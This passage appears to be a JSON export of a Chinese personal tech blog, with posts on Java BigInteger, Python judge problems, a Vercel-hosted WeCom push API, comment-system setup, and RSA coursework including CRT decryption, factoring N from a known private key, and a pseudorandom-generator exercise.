[{"title":"BigInteger 用法","url":"/2020/biginteger-usage/","content":"今天在写 RSA，又用到了java.math.BigInteger类1，总结一下常用的用法。（写完才发现\ngcd 和求逆方法都有了）\n\nBigInteger 介绍\n继承自Number类，可表示任意长度的整数。BigInteger用等号可以直接进行复制，而不是引用地址。\n构造方法\n\npublic BigInteger(int numBits, Random rnd)\n构造一个随机生成的numBits位的BigInteger。\npublic BigInteger(String val)\n将十进制字符串表示的val转为BigInteger。\npublic BigInteger(String val, int radix)\n将radix进制字符串表示的val转为BigInteger。\n\n常用方法\n\npublic BigInteger add(BigInteger val)\n加法。\npublic BigInteger subtract(BigInteger val)\n减法。\npublic BigInteger multiply(BigInteger val)\n乘法。\npublic BigInteger divide(BigInteger val)\n除法。\npublic BigInteger[] divideAndRemainder(BigInteger val)\n带余除法，返回商和余数。\npublic BigInteger remainder(BigInteger val)\n求余数。\npublic BigInteger mod(BigInteger m)\n取模，注意和取余的区别。\npublic BigInteger pow(int exponent)\n幂运算。\npublic BigInteger gcd(BigInteger val)\n求最大公因子。\npublic BigInteger abs()\n取绝对值。\npublic BigInteger negate()\n取相反数。\npublic BigInteger modPow(BigInteger exponent, BigInteger m)\n模幂。\npublic BigInteger modInverse(BigInteger m)\n求逆元。\npublic BigInteger shiftLeft(int n)\n左移n位。\npublic BigInteger shiftRight(int n)\n右移n位。\npublic int bitLength()\n返回二进制位数，不包括符号位。\npublic static BigInteger valueOf(long val)\n返回一个值为val的BigInteger。\npublic static BigInteger probablePrime(int bitLength, Random rnd)\n返回一个bitLength位的可能是素数的BigInteger。\npublic boolean isProbablePrime(int certainty)\n判断是否可能为素数，素数准确率为1 − 1/2certainty。\npublic int compareTo(BigInteger val)\n比较大小。小于返回-1，相等返回0，大于返回1。\npublic boolean equals(Object x)\n判断是否相等。\npublic String toString(int radix)\n返回以radix进制表示的字符串。若不传入参数，默认为十进制。\npublic int intValue()\n将BigInteger转为int。\n\n参考资料\n\n\n\nBigInteger\n(Java SE 14 &amp; JDK 14)↩︎\n\n\n","categories":["Java"],"tags":["Java","密码学","RSA"]},{"title":"Markdown 公式符号","url":"/2020/markdown-formula-symbol/","content":"记录一下部分 Markdown 公式中符号的代码。（本文将持续更新）\n\n\n\n\n符号名称\n显示效果\n代码\n\n\n\n\n小于等于号\n≤\n\\leqslant\n\n\n大于等于号\n≥\n\\geqslant\n\n\n根号\n$\\sqrt{2}$\n\\sqrt&#123;2&#125;\n\n\n根号\n$\\sqrt[n]{2}$\n\\sqrt[n]&#123;2&#125;\n\n\n\n","categories":["Markdown"],"tags":["Markdown"]},{"title":"OJ 上的三道 Python 题","url":"/2020/OJ-3-Python-problems/","content":"昨天在 OJ 上做了 19 级理科大计基的 12\n道题，有两个始终过不去，今天写了最后一道，过了。\n把这三道题分享一下。\n\n超市收银系统\n这题一直报WA\n时间限制: 1000 ms 内存限制: 65536 kb\n题目\n题目描述\n本题描述有更改，清注意\n一般超市或商店的收银台在对商品扫码之后会得到一串数字，这串数字代表一种商品。假设已知所有商品的名称、代码和单价，现在需要你写一个程序，输入扫码得到的商品代码（假设固定为\n6\n位数字），计算所购买的每种商品的数量（件数）、总价，并按照字典序打印商品的小票（如果某种商品购买了多件，应在同一行内输出该商品的名称、数量、单价和总价）。计算所购买所有商品的总金额，并打印。\n给出商品目录如下：\n格式：名称 代码 单价chips 932071 3.50chocolate 114049 8.00soap 304985 2.90cupcake 955962 4.90cookie 313903 6.50milk 243813 3.20toothbrush 961995 4.80toothpaste 933328 9.30teapot 914500 29.80\n输入\n每行为一个 6\n位数字，代表所购买的商品代码。当所有购买商品输入完毕时，以输入 0\n为结束输入标志。（毕竟你不可能跟收银员说我买了 n 件商品嘛）。\n输出\n一张小票，要求：\n第一行包含“NAME”、“QUANTITY”、“PRICE”、“SUM”（代表商品的名称、数量、单价和总价），各单词之间用若干空格分隔。\n接下来若干行，每行对应所购买的某种商品的明细。要求每列按照该项目内容字符数量最多的那一项填充空格补齐(第一行也要补齐)，要求每列左对齐，对齐之后项目之间还要空一格。\n总价输出保留两位小数，其余数字按照 Python\n默认输出。\n按照商品名称的字典序输出。提示：可使用\nlist.sort()\n最后一行是所购买所有商品的总金额，格式为：total:xxx.xx（注意：这里是西文的冒号，保留小数点后\n2 位）\n输入样例\n9320711140499320719320711140491140499320710\n输出样例\nNAME      QUANTITY PRICE SUMchips     4        3.5   14.00chocolate 3        8.0   24.00total:38.00\n解答\n由于商品信息已经给出，所以就直接手动排好序存在list里。\n扫描商品时录入的是代码，为了方便查询，这里使用了dict，以商品代码作为key，在list中的索引为value，便于直接查找。每扫描一个就增加对应商品的数量。\n最后输出时需要对齐，而商品不确定，所以需要先找到最长的商品名，然后对齐输出。\n代码如下：\n# 商品信息：商品名，单价，数量list = [[&quot;chips&quot;, 3.50, 0], [&quot;chocolate&quot;, 8.00, 0], [&quot;cookie&quot;, 6.50, 0], [&quot;cupcake&quot;, 4.90, 0], [    &quot;milk&quot;, 3.20, 0], [&quot;soap&quot;, 2.90, 0], [&quot;teapot&quot;, 29.80, 0], [&quot;toothbrush&quot;, 4.80, 0], [&quot;toothpaste&quot;, 9.30, 0]]# 商品代码及对应序号dic = &#123;&quot;932071&quot;: 0, &quot;114049&quot;: 1, &quot;313903&quot;: 2, &quot;955962&quot;: 3,       &quot;243813&quot;: 4, &quot;304985&quot;: 5, &quot;914500&quot;: 6, &quot;961995&quot;: 7, &quot;933328&quot;: 8&#125;# 第一列长度的最大值maxlen = 4while True:    x = input()    if x == &quot;0&quot;:        break    ## 商品数量加1    list[dic[x]][2] += 1    if(len(list[dic[x]][0]) &gt; maxlen):        maxlen = len(list[dic[x]][0])# 第一列与第二列间有空格maxlen += 1total = 0# 第一列print(&quot;NAME&quot;+&quot; &quot;*(maxlen-4)+&quot;QUANTITY PRICE SUM&quot;)for i in list:    # 输出数量不为0的商品    if i[2] != 0:        sum = i[2]*i[1]        total += sum        print(i[0]+&quot; &quot;*(maxlen-len(i[0]))+&quot;%-9d%-6.1f%.2f&quot; % (i[2], i[1], sum))print(&quot;total:%.2f&quot; % total)\n输出和样例一样，却一直报WA，也看不到题解，不知道为啥。\n代码对齐\n这题一直报PE\n时间限制: 1000 ms 内存限制: 65536 kb\n题目\n题目描述\nPython\n代码要求严格对齐才能执行。但是对齐问题往往很难发现，有时候只是某一行少了或者多了一个空格，就会报错。现在请你编写一个\nPython 程序来帮你整理一下代码，解决少空格或多空格的问题。\n要求：\n（1）把所有的 tab('\\t')换成 4 个空格。\n（2）使每一行前的空格数必须是 4\n的倍数。把空格补充成不小于自身的最小的 4 的倍数。如，3 个空格补成 4\n个，5 个空格补成 8 个。\n注意：这样的要求并不能保证输出代码一定是语法正确的。\n（3）确保“#”与注释文字间至少有一个空格。只需要处理每行的第一个“#”即可，将后面的“#”看做注释中的文字。\n输入\n第一行是一个正整数 n，代表代码的行数。\n接下来 n 行，是需要整理的代码。\n输出\n整理后的代码。\n输入样例\n8#terrible codefor i in range(100):   if i % 2 == 0:       print(&#x27;%d is an even number\\n&#x27;%i)  if i % 3 == 0:     print(&#x27;%d can be divided by 3\\n&#x27;%i)#tell people it&#x27;s overprint(&#x27;It\\&#x27;s over&#x27;)\n输出样例\n# terrible codefor i in range(100):    if i % 2 == 0:        print(&#x27;%d is an even number\\n&#x27;%i)    if i % 3 == 0:        print(&#x27;%d can be divided by 3\\n&#x27;%i)# tell people it&#x27;s overprint(&#x27;It\\&#x27;s over&#x27;)\n解答\n先处理tab，利用str.expandtabs()函数将所有tab替换为\n4 个空格。\n然后补全空格，先算出行首空格数，然后用str.lstrip()去掉空格再添加空格。\n最后补全#后的空格，遍历搜索。\n代码如下：\nimport mathn = int(input())for j in range(n):    line = input()    length = len(line)    # 替换tab后去掉开头空格    line = line.expandtabs(4).lstrip()    # 补全空格    line = &quot; &quot;*math.ceil((length-len(line))/4)*4+line    lis = list(line)    # 补上第一个#后的空格    for i in range(len(lis)):        if(lis[i] == &#x27;#&#x27; and i+1 &lt; len(lis) and lis[i+1] != &#x27; &#x27;):            lis.insert(i+1, &#x27; &#x27;)    print(&quot;&quot;.join(lis))\n输出和样例一样，一直报PE。\n转圈圈\n这题总算过了\n时间限制: 1000 ms 内存限制: 65536 kb\n题目\n题目描述\n情人节到了（其实是过去了），偷偷送大家一道题。\n本题要求你输出一个尺寸为 d×d 的数阵，数字的排列方式是从 1 到 n\n循环且顺时针转圈，看样例输出。\n输入\n两行，第一行是正整数 n(n&lt;10)，第二行是正整数 d(d&lt;20)\n输出\n转圈圈的数阵\n输入样例 1\n64\n输出样例 1\n1 2 3 46 1 2 55 4 3 64 3 2 1\n输入样例 2\n55\n输出样例 2\n1 2 3 4 51 2 3 4 15 4 5 5 24 3 2 1 33 2 1 5 4\n解答\n想法比较简单，设置一个变量用于控制填充方向，到达拐点后改变方向。\n代码如下：\nn = int(input())d = int(input())# d*d列表a = [[0]*d for i in range(d)]# 填充方向direct = 0# 当前填充坐标x = 0y = 0for i in range(d*d):    a[x][y] = i % n+1    if direct == 0:        if y+1 &lt; d and a[x][y+1] == 0:            y += 1        else:            x += 1            direct = 1    elif direct == 1:        if x+1 &lt; d and a[x+1][y] == 0:            x += 1        else:            y -= 1            direct = 2    elif direct == 2:        if a[x][y-1] == 0:            y -= 1        else:            x -= 1            direct = 3    else:        if a[x-1][y] == 0:            x -= 1        else:            y += 1            direct = 0for i in a:    s = [str(j) for j in i]    print(&quot; &quot;.join(s))\n这题总算过了。\n","categories":["Python"],"tags":["Python"]},{"title":"利用 Vercel 搭建企业微信消息推送 API","url":"/2022/wecom-push-api/","content":"Vercel\n是一个用于前端框架和静态站点的平台，可以用来部署静态网站和 Serverless\n函数，功能强大，使用方便。\n企业微信提供一系列的\nAPI 接口，可以通过企业微信应用或群机器人发送消息，而且企业微信接入了 MiPush，在\nMIUI 系统上可以无后台接收消息。\n\n但是发送企业微信应用消息比较麻烦，要先通过corpid和corpsecret获取access_token，然后通过\nPOST 请求发送消息。所以我利用 Vercel 搭建了一个 Serverless\n函数，只需要一个token就可以发送消息，非常方便。\n接口说明\n请求地址为https://api.meancoder.xyz/push，参数如下：\n\n\n\n参数\n必须\n说明\n\n\n\n\ntoken\n是\n在环境变量中设置的TOKEN，用于验证身份\n\n\ncontent\n是\n消息内容\n\n\nmsgtype\n否\ntext或markdown，默认为text\n\n\ntouser\n否\n指定接收消息的成员，默认为Mean\n\n\n\n代码\n# -*- coding: utf8 -*-import requestsimport jsonimport osimport urllib.parsefrom http.server import BaseHTTPRequestHandlerdef push(content, touser, msgtype):    params = &#123;        &#x27;corpid&#x27;: os.environ[&#x27;CORPID&#x27;],        &#x27;corpsecret&#x27;: os.environ[&#x27;CORPSECRET&#x27;]    &#125;    access_token = json.loads(requests.get(        &#x27;https://qyapi.weixin.qq.com/cgi-bin/gettoken&#x27;, params=params).text)[&#x27;access_token&#x27;]    push_url = &#x27;https://qyapi.weixin.qq.com/cgi-bin/message/send?access_token=&#x27;+access_token    data = &#123;        &#x27;msgtype&#x27;: msgtype,        &#x27;agentid&#x27;: os.environ[&#x27;AGENTID&#x27;],        msgtype: &#123;            &#x27;content&#x27;: content        &#125;,        &#x27;touser&#x27;: touser    &#125;    response = requests.post(push_url, json=data)    return response.textclass handler(BaseHTTPRequestHandler):    def do_GET(self):        errcode = 0        errmsg = &quot;ok&quot;        content = &quot;&quot;        touser = &quot;Mean&quot;        msgtype = &quot;text&quot;        datas = urllib.parse.parse_qs(self.path.split(&quot;?&quot;)[1])        if &quot;token&quot; not in datas:            errcode = -1            errmsg = &quot;no token&quot;        elif datas[&quot;token&quot;][0] != os.environ[&quot;TOKEN&quot;]:            errcode = -2            errmsg = &quot;invalid token&quot;        if &quot;content&quot; in datas:            content = datas[&quot;content&quot;][0]        else:            errcode = -3            errmsg = &quot;no content&quot;        if &quot;touser&quot; in datas:            touser = datas[&quot;touser&quot;][0]        if &quot;msgtype&quot; in datas:            if datas[&quot;msgtype&quot;][0] not in [&quot;text&quot;, &quot;markdown&quot;]:                errcode = -4                errmsg = &quot;invalid token&quot;            else:                msgtype = datas[&quot;msgtype&quot;][0]        if errcode == 0:            errmsg = push(content, touser, msgtype)        else:            errmsg = json.dumps(&#123;&quot;errcode&quot;: errcode, &quot;errmsg&quot;: errmsg&#125;)        self.send_response(200)        self.send_header(&#x27;Content-type&#x27;, &#x27;text/plain&#x27;)        self.end_headers()        self.wfile.write(errmsg.encode())        return\n重定向\n由于 api\n要放在/api路径下，默认是通过https://api.meancoder.xyz/api/push发送请求。如果在根目录配置vercel.json文件，就可以把/api重定向到根目录，就能直接通过https://api.meancoder.xyz/push发送请求了。\n&#123;  &quot;rewrites&quot;: [    &#123;      &quot;source&quot;: &quot;/:path*&quot;,      &quot;destination&quot;: &quot;/api/:path*&quot;    &#125;  ]&#125;\n","categories":["Serverless"],"tags":["Serverless"]},{"title":"Valine 添加邮件提醒","url":"/2020/add-email-notice/","content":"注意\n本站评论系统已迁移到Twikoo，查看详情。\n\n我的博客一直用的是Valine，这也是我最喜欢的评论系统，简洁高效。但是美中不足的是邮件提醒功能将在\nv1.4.0 时下线了，不过官网也给出了替代方法：Valine-Admin。我在小康的基础上修改了一下，改了一下邮件模板，去掉了几个我用不上的参数，而且由于评论都是以\nHTML 形式保存的，而Server\n酱暂时不兼容 HTML，所以我加入了另一个微信推送服务pushplus(推送加)微信推送消息直达。\n\n安装过程就不多说了，今天还特地注册了国际版的\nLeanCloud（因为没备案），按照教程还是很简单的，发送邮件的账号刚好用上了我用这个域名注册的企业邮箱。\nValine-Admin 实现了收到消息后即时通过邮件提醒用户，并利用\npush+提醒博主。对于没有后端的 Valine\n来说，这个功能是非常实用的。还有后台管理，可以直接查看和管理评论，非常方便（然而并没有人给我留言）。\n当然，对于白嫖用户，LeanCloud\n还是有一定限制的，免费的云引擎会自动休眠，而且每天强制休眠 6\n小时，自带的定时唤醒也被官方限制了，不过现在用 Github Actions\n可以定时唤醒。而且用云函数实现了定时重发，应该不会漏消息了。\n这个版本是我自己用的，以后完善一下可能会公开。\n","categories":["博客"],"tags":["博客"]},{"title":"博客更换域名和评论系统","url":"/2022/change-domain-and-comment/","content":"之前在考研，一直没时间更新博客。考完之后又一直懒得写，最近才开始恢复更新。这段时间博客网址换回了以前的www.meancoder.xyz，评论也换成了Twikoo。\n\n更换域名\n最开始的 xyz\n域名只买了一年，当时活动只要一块钱。可惜以前不知道域名有什么用，那时候十年才一百多，没活动的话续费又很贵。后来又买了一年的\ntop 域名，但是还是比较喜欢 xyz 域名，所以等赎回期过后买了 5\n年，以后等有活动再多续几年。\n更换评论系统\n之前博客用的评论系统是Valine，但是存在一些安全隐患，而且\nLeanCloud 会自动休眠(虽然我的博客也没人看)。所以评论系统换成了Twikoo，后端用腾讯云开发部署，前端\nNexT 主题直接使用hexo-next-twikoo插件。\n\n最后附上自定义的邮件通知模板。\n通知邮件模板博主通知邮件模板&lt;div class=&quot;extend header&quot; style=&quot;background: #1e1f27; padding: 40px 20px;&quot;&gt;  &lt;div    class=&quot;extend-inner header-inner&quot;    style=&quot;max-width: 600px; margin: 0 auto;&quot;  &gt;    &lt;a      href=&quot;$&#123;SITE_URL&#125;&quot;      style=&quot;color: #fff; text-decoration: none;font-size:30px;font-weight:normal&quot;    &gt;      $&#123;SITE_NAME&#125;    &lt;/a&gt;  &lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;extend title&quot; style=&quot;padding: 20px 20px; background: #f9f9f9;&quot;&gt;  &lt;div    class=&quot;extend-inner title-inner&quot;    style=&quot;max-width: 600px; margin: 0 auto;&quot;  &gt;    &lt;h1      style=&quot;font-weight: 300; font-size: 1.4em; margin: 0.67em 0; line-height: 1.4;&quot;    &gt;      $&#123;NICK&#125; 回复了您的评论    &lt;/h1&gt;  &lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;extend content&quot; style=&quot;padding: 20px 20px;&quot;&gt;  &lt;div    class=&quot;extend-inner content-inner&quot;    style=&quot;max-width: 600px; margin: 0 auto;&quot;  &gt;    &lt;p&gt;      &lt;strong&gt;$&#123;PARENT_NICK&#125;&lt;/strong&gt;，您曾在      &lt;a        href=&quot;$&#123;SITE_URL&#125;&quot;        style=&quot;color: rgb(3,120,221);border-bottom: 1.0px solid rgb(3,120,221);text-decoration: none;margin-bottom: 2.0px;&quot;        &gt;$&#123;SITE_NAME&#125;&lt;/a      &gt;      上发布评论：    &lt;/p&gt;    &lt;div      class=&quot;extend footer&quot;      style=&quot;padding: 20px 20px; background: #eee; color: #666; font-size: 90%;&quot;    &gt;      &lt;div        class=&quot;extend-inner footer-inner&quot;        style=&quot;max-width: 600px; margin: 0 auto;&quot;      &gt;        $&#123;PARENT_COMMENT&#125;      &lt;/div&gt;    &lt;/div&gt;    &lt;p&gt;&lt;strong&gt;$&#123;NICK&#125;&lt;/strong&gt; 回复：&lt;/p&gt;    &lt;div      class=&quot;extend footer&quot;      style=&quot;padding: 20px 20px; background: #eee; color: #666; font-size: 90%;&quot;    &gt;      &lt;div        class=&quot;extend-inner footer-inner&quot;        style=&quot;max-width: 600px; margin: 0 auto;&quot;      &gt;        $&#123;COMMENT&#125;      &lt;/div&gt;    &lt;/div&gt;    &lt;p&gt;      &lt;a        href=&quot;$&#123;POST_URL&#125;&quot;        style=&quot;color: rgb(3,120,221);border-bottom: 1.0px solid rgb(3,120,221);text-decoration: none;margin-bottom: 2.0px;&quot;        &gt;查看评论&lt;/a      &gt;    &lt;/p&gt;    &lt;hr      style=&quot;display: block;height: 1.0px;border: 0;border-top: 5.0px solid rgb(238,238,238);margin: 1.0em 0;padding: 0;&quot;    /&gt;    &lt;p      class=&quot;text-center shy&quot;      style=&quot;color: rgb(153,153,153);text-align: center;&quot;    &gt;      扫二维码，关注微信公众号    &lt;/p&gt;    &lt;p class=&quot;text-center&quot; style=&quot;text-align: center;&quot;&gt;      &lt;img        src=&quot;https://www.meancoder.xyz/images/wechat_channel.png&quot;        style=&quot;max-width: 400px;width: 100%;&quot;      /&gt;    &lt;/p&gt;  &lt;/div&gt;&lt;/div&gt;&lt;div  class=&quot;extend footer&quot;  style=&quot;padding: 20px 20px; background: #eee; color: #666; font-size: 90%;&quot;&gt;  &lt;div    class=&quot;extend-inner footer-inner&quot;    style=&quot;max-width: 600px; margin: 0 auto;&quot;  &gt;    &lt;p&gt;      欢迎再次访问      &lt;a href=&quot;$&#123;SITE_URL&#125;&quot; style=&quot;color: #444;&quot;&gt;$&#123;SITE_NAME&#125;&lt;/a      &gt;，如果有疑问或其他想法，&lt;a        href=&quot;mailto:390602272@qq.com&quot;        style=&quot;color: #444;&quot;        &gt;请与我联系&lt;/a      &gt;。    &lt;/p&gt;    &lt;p&gt;本邮件由系统自动发出，请勿直接回复。&lt;/p&gt;  &lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;extend header&quot; style=&quot;background: #1e1f27; padding: 40px 20px;&quot;&gt;  &lt;div    class=&quot;extend-inner header-inner&quot;    style=&quot;max-width: 600px; margin: 0 auto;&quot;  &gt;    &lt;a      href=&quot;$&#123;SITE_URL&#125;&quot;      style=&quot;color: #fff; text-decoration: none;font-size:30px;font-weight:normal&quot;    &gt;      $&#123;SITE_NAME&#125;    &lt;/a&gt;  &lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;extend title&quot; style=&quot;padding: 20px 20px; background: #f9f9f9;&quot;&gt;  &lt;div    class=&quot;extend-inner title-inner&quot;    style=&quot;max-width: 600px; margin: 0 auto;&quot;  &gt;    &lt;h1      style=&quot;font-weight: 300; font-size: 1.4em; margin: 0.67em 0; line-height: 1.4;&quot;    &gt;      $&#123;NICK&#125; 发布了新评论    &lt;/h1&gt;  &lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;extend content&quot; style=&quot;padding: 20px 20px;&quot;&gt;  &lt;div    class=&quot;extend-inner content-inner&quot;    style=&quot;max-width: 600px; margin: 0 auto;&quot;  &gt;    &lt;p&gt;&lt;strong&gt;$&#123;NICK&#125;&lt;/strong&gt; 发布评论：&lt;/p&gt;    &lt;div      class=&quot;extend footer&quot;      style=&quot;padding: 20px 20px; background: #eee; color: #666; font-size: 90%;&quot;    &gt;      &lt;div        class=&quot;extend-inner footer-inner&quot;        style=&quot;max-width: 600px; margin: 0 auto;&quot;      &gt;        $&#123;COMMENT&#125;      &lt;/div&gt;    &lt;/div&gt;    &lt;p&gt;      &lt;a        href=&quot;$&#123;POST_URL&#125;&quot;        style=&quot;color: rgb(3,120,221);border-bottom: 1.0px solid rgb(3,120,221);text-decoration: none;margin-bottom: 2.0px;&quot;        &gt;查看评论&lt;/a      &gt;    &lt;/p&gt;  &lt;/div&gt;&lt;/div&gt;\n","categories":["博客"],"tags":["博客"]},{"title":"改进的混合基数转换法（MMRC）","url":"/2020/MMRC/","content":"混合基数转换法（Mixed-Radix Conversion, MRC）是求 CRT\n唯一解的方法，Kunth\n对其进行了改进。可将改算法改进为改进的混合基数转换法（Modified\nMixed-Radix Conversion, MMRC）。\n\nMRC 比较复杂，在这里不做介绍，可以参考《中国剩余定理在\nRSA 解密中的应用》1。\nMMRC\n下面来介绍一下 MMRC：\n设同余方程组为：\n$$\n\\begin{cases}\nx≡d_1\\pmod{p_1}\\\\\nx≡d_2\\pmod{p_2}\\\\\n......\\\\\nx≡d_s\\pmod{p_s}\\\\\n\\end{cases}\n$$\n\n计算Bji ← pj−1 (mod  pi)(1≤j&lt;i≤s)；\n令ai1 = di(1≤i≤s)，由递推公式ai(j+1) = (aij−ajj)Bji mod  pi(1≤j&lt;i≤s)，计算a11, a22, ..., ass;\n计算唯一解x ← a11 + a22p1 + a33p1p2 + ... + assp1p2p3...ps。\n\n特别地，对于只包含两个方程的方程组\n$$\n\\begin{cases}\nx≡d_1\\pmod{p_1}\\\\\nx≡d_2\\pmod{p_2}\\\\\n\\end{cases}\n$$\n可以这样计算：\n\n计算B12 ← p1−1 (mod  p2)；\na11 = d1，a21 = d2，计算a22 = (a21−a11)B12 mod  p2;\n计算唯一解x ← a11 + a22p1。\n\nMMRC 在 RSA 解密中的作用\nRSA 的解密过程为M = Cd mod  N，而N = pq且p和q互素，所以 M 可以通过下式求出：\n$$\n\\begin{cases}\nm_1≡C^d\\pmod p\\\\\nm_2≡C^d\\pmod q\\\\\n\\end{cases}\n$$\n其中m1 = Cd mod  p，m2 = Cd mod  q。\n由此我们可以得到快速解密的算法：\n\n计算m1 ← (C mod  p)d mod  p − 1 mod  p，m2 ← (C mod  q)d mod  q − 1 mod  q；\n计算p−1 (mod  q)；\n计算t ← p−1(m2−m1) mod  q；\n计算明文M ← m1 + tp。\n\n在第 1 步中，由于p是素数，由费马小定理2可得，Cp − 1 ≡ 1 (mod  p)，所以(C mod  p)d mod  p − 1 mod  p = Cd mod  p，m2同理。\n下面给出我的代码，完整代码见MeanZhang/RSA:\nRSA-Java。\n/** * RSA解密 * 使用了MMRC算法 * * @param c 密文 * @param d 私钥d * @param p p * @param q q * @return 明文 */public static BigInteger decrypt(BigInteger c, BigInteger d, BigInteger p, BigInteger q) &#123;    // m1 ≡ c^d ≡ (c mod p)^(d mod (p-1))(mod p)    BigInteger m1 = c.mod(p).modPow(d.mod(p.subtract(BigInteger.ONE)), p);    // m2 ≡ c^d ≡ (c mod q)^(d mod (q-1))(mod q)    BigInteger m2 = c.mod(q).modPow(d.mod(q.subtract(BigInteger.ONE)), q);    BigInteger invP = p.modInverse(q);    // t = p^(-1) * (m2-m1) mod q    BigInteger t = invP.multiply(m2.subtract(m1)).mod(q);    return m1.add(t.multiply(p));&#125;\n参考资料\n\n\n\n中国剩余定理在\nRSA 解密中的应用–《河北省科学院学报》2003 年 03 期↩︎\n费马小定理 -\n维基百科，自由的百科全书↩︎\n\n\n","categories":["抽象代数","中国剩余定理"],"tags":["密码学","RSA","抽象代数","中国剩余定理"]},{"title":"RSA 已知 e，d 和 n，分解 N","url":"/2020/RSA-given-e-d-n-factorize-n/","content":"这次的密码学实验有一个已知 e ， d 和 N ，分解 N\n的问题，想了很久（其实没想多久，试了一下就放弃了），然后就到网上找资料。找到了一个很好用的网站，DI Management\nHome，都是关于密码学的，里面就有关于这个问题的算法1。\n\n\nInitially we compute k = de − 1 . We\nthen choose a random integer g\nin the range 1 &lt; g &lt; N . Now k is an even number, where k = 2tr\nwith r odd and t ≥ 1 , so we can compute x = gk/2, gk/4, …, gk/2t (mod  N)\nuntil x &gt; 1 and y = gcd (x−1,N) &gt; 1\n. If so, then one of our factors, say p , is equal to y , and the other is q = N/y and we are\ndone. If we don’t find a solution, then we choose another random g .\nDI Management - RSA: how to\nfactorize N given d\n\n简单翻译一下：\n\n首先我们计算 k = de − 1\n。然后选择一个随机数 g ，满足\n1 &lt; g &lt; N 。\nk 是偶数，所以 k = 2tr\n，其中 r 是奇数且 t ≥ 1 ，然后计算 x = gk/2, gk/4, …, gk/2t (mod  N)，直到\nx &gt; 1 且 y = gcd (x−1,N) &gt; 1\n。 如果这样的 y\n存在，那么其中一个因子 p 等于\ny ，并且 q = N/y\n，这样就完成了。如果这样的 y\n不存在，就重新生成随机数 g\n。\n\n下面是我的代码，对原算法稍微进行了一点改动。原算法是先计算出 t 和 r ，然后依次计算 x = gk/2i\n。这里我不计算 t 和 r ，而是只要 k 是偶数，就将其除以 2，然后计算\nx = gk\n并判断是否满足条件。这样可以减少一些计算，但是由于 t 并不大，所以减少的计算有限。\n完整代码见MeanZhang/RSA:\nRSA-Java。\n/** * 已知e，d，n，分解n * * @param e 公钥e * @param d 私钥d * @param n 模数n * @return p，q */public static BigInteger[] attack(BigInteger e, BigInteger d, BigInteger n) &#123;    // p,q    BigInteger[] result = new BigInteger[2];    // k=de-1    BigInteger k = d.multiply(e).subtract(BigInteger.ONE);    Random random = new Random();    while (true) &#123;        BigInteger g = new BigInteger(n.bitLength(), random);        // 选择随机数g，1&lt;g&lt;n        while (g.compareTo(BigInteger.ONE) &lt;= 0 || g.compareTo(n) &gt;= 0)            g = new BigInteger(n.bitLength(), random);        BigInteger k1 = k;        // 计算t和g^(k/2^i)的过程合在一起        while (k1.mod(BigInteger.TWO).equals(BigInteger.ZERO)) &#123;            // 如果k为偶数，就除以2            k1 = k1.shiftRight(1);            // 此时g^(k/2^i)=g^k1            BigInteger x = g.modPow(k1, n);            // 计算y=gcd(x−1,n)，直接赋值给p(result[0])            result[0] = x.subtract(BigInteger.ONE).gcd(n);            // 如果x&gt;1且y=gcd(x−1,n)&gt;1            if (x.compareTo(BigInteger.ONE) &gt; 0 &amp;&amp; result[0].compareTo(BigInteger.ONE) &gt; 0) &#123;                result[1] = n.divide(result[0]);                return result;            &#125;        &#125;    &#125;&#125;\n测试数据：\ne:65537d:13085102850405329895940153649208766646679432053055210927814587187939575969334380946175257120108607885616731724467899991987963542311668962802613624160423864736904359544115910805381019345850330276964971412664144174157825068713331109139842487999112829255389047329358923488846912437792391102853729375052922599258215311601018992134762683570752403675370812499995354701024990414541327012769030147878934713424171374951602988478984432403148854042370903764361797455965930292322795814453835335323397068237664481359506461188857661605832041501219728374514303209642746672993156029099655958158717907546664548938973389857200804582177n:21378032245774894186324720788457768851857953294637267751313371903474996018902810092972224806315945430514626988743400353365786674788848003569698586194388463460699531620948408197942261177369324808332585418351947368544183614904162658914539989430070735676083960582943505227316151479174351490943931346982185481068889458087344890907035731467000101100009111593455801160870652558847164438348031498067369123608755518383163346962891967964682970251625764813457371461595048927486942272152822570449609158417324070867001419543608370026546341531367233199832189762919523227554947408242727690461831545997600374969434706782376320559561p:134015724574231629415725856596339106132655429815809390083191653420751276014515665041469448212111089978027787330894345961709429696830117657137052704491606694791519141111894965847240833879740293408266251425861598011543042632576624378597158795956174622709934079034648552634466265913328434606944071200422868130573q:159518834925475861956097917917341301031640418209579419960447972340833353891477422457476074816300423813142613130845835933143395284444599641612757310435466623981281701817688676270876235464147642571713805328342460087461430626730047957682558277868352127107752854583156354513612089006699159193484825862868615965357\n参考资料\n\n\n\nRSA: how to\nfactorize N given d↩︎\n\n\n","categories":["密码学","RSA"],"tags":["密码学","RSA","抽象代数"]},{"title":"密码编码学与网络安全第七版习题 8.2","url":"/2020/cryptography-and-network-security-problem-8.2/","content":"这道题是密码学的作业，开始不会写，答案只有结果而没有过程，后来查了一些资料才算是搞明白了。\n题目如下：\n\n\n下述的伪随机数发生器可获得的最大周期是多少？\n\nXn + 1 = (aXn) mod  24\n\n这时 a 为多少？\n对种子有什么要求？\n\n\n\n解答如下：\n(a)\n\n首先引入这样一个结论：对任意的奇数a与正整数n，有：a2n ≡ 1 (mod  2n + 2)。用归纳法证明这个结论：\n\n当n = 1时，存在整数b，c，使得\na2n = (2b+1)2 = 4b(b+1) + 1 = 23c + 1 ≡ 1 (mod  23)\n假设当n = k时，命题成立，即\na2k ≡ 1 (mod  2k + 2)\n则存在整数c，使得\na2k = 2k + 2c + 1\n当n = k + 1时，存在整数k，b，使得\na2k + 1 = (2k + 2c+1)2 = 22k + 4c2 + 2 · 2k + 2c + 1 = 2k + 3c(2k + 1c+1) + 1 ≡ 1 (mod  2k + 3)\n即当n = k + 1时，命题成立。\n\n由 1，2 可得，该命题成立。\n\n若a与24不互素，即a为偶数，令a = 2k，则\na4 = 16k4 ≡ 0 (mod  24)\n从而\n0 = Xn + 4 ≡ a4Xn (mod  24)\n产生的第四个数之后全为 0，所以a与24互素。\n又因为\na2n ≡ 1 (mod  2n + 2)\n所以\na24 − 2 = a4 ≡ 1 (mod  24)\n从而\na4Xn ≡ Xn (mod  24)\n即\nXn + 4 = Xn\n所以最大周期为 4。\n(b)\n由(a)可知，a为奇数。\n经计算，a = 7, 9, 15时，周期为 2。\na = 3, 5, 11, 13时，周期为\n4。\n(c)\n种子必须为奇数，否则周期会不大于 